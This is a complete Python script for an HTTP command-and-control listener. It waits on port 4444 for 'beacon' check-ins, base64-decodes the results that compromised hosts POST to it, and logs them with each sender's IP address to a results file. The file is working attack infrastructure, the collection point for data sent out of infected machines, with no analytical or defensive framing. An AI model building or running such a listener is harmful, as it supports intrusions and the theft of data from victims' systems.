"""HTTP C2 listener — receives POST results from beacon"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys, base64, os

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'c2_results.txt')

def log(msg):
    with open(LOG, 'a', encoding='utf-8') as f:
        f.write(msg + '\n')
    sys.stderr.write(msg + '\n')
    sys.stderr.flush()

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        try:
            text = base64.b64decode(body).decode('utf-8', errors='replace')
        except:
            text = body.decode('utf-8', errors='replace')
        log(f"\n{'='*60}")
        log(f"[FROM: {self.client_address[0]}]")
        log(text)
        log(f"{'='*60}")
        self.send_response(200)
        self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"ok")
    
    def log_message(self, fmt, *args):
        log(f"[HTTP] {fmt % args}")

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    server = HTTPServer(('0.0.0.0', port), Handler)
    log(f"C2 listener on :{port} — waiting for results...")
    server.serve_forever()
